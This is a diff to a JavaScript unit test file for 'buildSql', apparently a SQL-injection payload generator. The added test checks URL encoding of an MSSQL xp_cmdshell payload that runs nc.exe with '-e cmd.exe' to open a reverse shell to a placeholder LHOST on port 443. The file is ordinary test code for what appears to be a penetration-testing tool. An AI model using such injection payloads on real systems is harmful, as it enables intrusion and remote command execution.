@@ -73,6 +73,13 @@ describe("buildSql", () => {
     expect(buildSql("mssql-xp_cmdshell", "mssql", "form-field", { ...V, shell: "nc-exe" }).text).toContain(" -e cmd.exe");
   });
 
+  it("url-param keeps unresolved placeholders visible while braces in the data are encoded", () => {
+    const b = buildSql("mssql-xp_cmdshell", "mssql", "url-param", { LPORT: "443", shell: "nc-exe" });
+    expect(b.unresolved).toEqual(["LHOST"]);
+    expect(b.text).toBe("%27%3B+EXEC+xp_cmdshell+%27C:%5CWindows%5CTemp%5Cnc.exe+%2de+cmd.exe+{LHOST}+443%27%3B--+-");
+    expect(buildSql("mssql-xp_cmdshell", "mssql", "url-param", { cmd: "echo {x}" }).text).toContain("echo+%7Bx%7D");
+  });
+
   it("missing LHOST goes to unresolved", () => {
     const b = buildSql("postgres-copy-program", "postgres", "form-field", { LPORT: "443" });
     expect(b.unresolved).toContain("LHOST");
